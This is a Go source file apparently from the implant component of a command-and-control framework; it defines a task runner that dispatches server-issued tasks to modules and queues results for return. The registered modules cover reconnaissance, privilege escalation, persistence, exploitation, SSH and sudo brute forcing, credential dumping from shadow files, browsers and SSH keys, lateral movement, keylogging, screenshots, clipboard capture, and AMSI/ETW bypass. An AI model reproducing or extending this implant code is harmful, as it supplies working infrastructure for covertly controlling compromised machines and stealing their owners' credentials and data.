package executor

import (
	"context"
	"fmt"
	"sync"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"github.com/natx6/ananse/src/c2/implant/module"
)

// ModuleFunc is a function that executes a specific task type.
type ModuleFunc func(params map[string]interface{}) (string, error)

// TaskRunner manages async task execution and result collection.
type TaskRunner struct {
	mu      sync.Mutex
	running map[string]context.CancelFunc
	results []beacon.PendingResult
	seq     int
	modules map[string]ModuleFunc
}

// NewTaskRunner creates a runner with default module registry.
func NewTaskRunner() *TaskRunner {
	r := &TaskRunner{
		running: make(map[string]context.CancelFunc),
		results: nil,
		seq:     0,
	}
	r.registerDefaults()
	return r
}

// RegisterModule adds or overrides a task type handler.
func (r *TaskRunner) RegisterModule(taskType string, fn ModuleFunc) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.modules[taskType] = fn
}

func (r *TaskRunner) registerDefaults() {
	r.modules = map[string]ModuleFunc{
		"recon_processes":     module.RunReconProcesses,
		"recon_network":       module.RunReconNetwork,
		"recon_users":         module.RunReconUsers,
		"recon_cron":          module.RunReconCron,
		"recon_suid":          module.RunReconSuid,
		"recon_all":           module.RunReconAll,
		"privesc_sudo":        module.RunPrivescSudo,
		"privesc_writable":    module.RunPrivescWritable,
		"privesc_kernel":      module.RunPrivescKernel,
		"privesc_all":         module.RunPrivescAll,
		"persistence_ssh":     module.RunPersistenceSSH,
		"persistence_startup": module.RunPersistenceStartup,
		"persistence_all":     module.RunPersistenceAll,
		"exploit_packages":    module.RunExploitPackages,
		"exploit_services":    module.RunExploitServices,
		"exploit_all":         module.RunExploitAll,
		"monitor_fim":         module.RunMonitorFIM,
		"monitor_rootkit":     module.RunMonitorRootkit,
		"monitor_all":         module.RunMonitorAll,
		"brute_sudo":           module.RunBruteSudo,
		"brute_ssh":            module.RunBruteSSH,
		"brute_local":          module.RunBruteLocal,
		"brute_all":            module.RunBruteAll,
			// Credential dumping
		"credential_shadow":     module.RunCredentialShadow,
		"credential_browsers":   module.RunCredentialBrowsers,
		"credential_ssh_keys":   module.RunCredentialSSHKeys,
		"credential_configs":    module.RunCredentialConfigs,
		"credential_all":        module.RunCredentialAll,

		// Lateral movement
		"lateral_ssh":           module.RunLateralSSH,
		"lateral_all":           module.RunLateralAll,

		// Collection (keylogging, screenshot, clipboard)
		"collect_keylog":        module.RunCollectKeylog,
		"collect_screenshot":    module.RunCollectScreenshot,
		"collect_clipboard":     module.RunCollectClipboard,
		"collect_all":           module.RunCollectAll,

		// Bypass (Windows-only — will compile to no-op stub on other platforms)
		"bypass_amsi":           module.RunBypassAmsi,
		"bypass_etw":            module.RunBypassEtw,
		"bypass_all":            module.RunBypassAll,
	}
}

// ExecuteTaskAsync starts a task in a background goroutine.
func (r *TaskRunner) ExecuteTaskAsync(task beacon.C2TaskAssignment) {
	ctx, cancel := context.WithCancel(context.Background())

	r.mu.Lock()
	r.running[task.TaskID] = cancel
	r.mu.Unlock()

	go func() {
		defer cancel()

		result := r.runTask(ctx, task)

		r.mu.Lock()
		delete(r.running, task.TaskID)
		r.results = append(r.results, result)
		r.mu.Unlock()
	}()
}

func (r *TaskRunner) runTask(ctx context.Context, task beacon.C2TaskAssignment) beacon.PendingResult {
	startedAt := time.Now().UTC().Format(time.RFC3339)

	r.mu.Lock()
	r.seq++
	seq := r.seq
	r.mu.Unlock()

	// Look up module function
	r.mu.Lock()
	fn, ok := r.modules[task.Type]
	r.mu.Unlock()

	if !ok {
		return beacon.PendingResult{
			TaskID:      task.TaskID,
			SequenceNum: seq,
			Success:     false,
			Data:        "",
			Error:       fmt.Sprintf("unknown task type: %s", task.Type),
			StartedAt:   startedAt,
			CompletedAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	// Execute
	data, err := fn(task.Params)
	completedAt := time.Now().UTC().Format(time.RFC3339)

	if err != nil {
		return beacon.PendingResult{
			TaskID:      task.TaskID,
			SequenceNum: seq,
			Success:     false,
			Data:        data,
			Error:       err.Error(),
			StartedAt:   startedAt,
			CompletedAt: completedAt,
		}
	}

	return beacon.PendingResult{
		TaskID:      task.TaskID,
		SequenceNum: seq,
		Success:     true,
		Data:        data,
		StartedAt:   startedAt,
		CompletedAt: completedAt,
	}
}

// PendingResults returns a snapshot of all un-acked results.
func (r *TaskRunner) PendingResults() []beacon.PendingResult {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make([]beacon.PendingResult, len(r.results))
	copy(out, r.results)
	return out
}

// AckResults removes results whose TaskID appears in the acked list.
func (r *TaskRunner) AckResults(ackedIDs []string) {
	acked := make(map[string]struct{}, len(ackedIDs))
	for _, id := range ackedIDs {
		acked[id] = struct{}{}
	}

	r.mu.Lock()
	defer r.mu.Unlock()

	keep := make([]beacon.PendingResult, 0, len(r.results))
	for _, pr := range r.results {
		if _, ok := acked[pr.TaskID]; !ok {
			keep = append(keep, pr)
		}
	}
	r.results = keep
}

// CancelRunning cancels a specific running task.
func (r *TaskRunner) CancelRunning(taskID string) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	cancel, ok := r.running[taskID]
	if !ok {
		return false
	}
	cancel()
	delete(r.running, taskID)
	return true
}

// RunningCount returns the number of currently executing tasks.
func (r *TaskRunner) RunningCount() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return len(r.running)
}
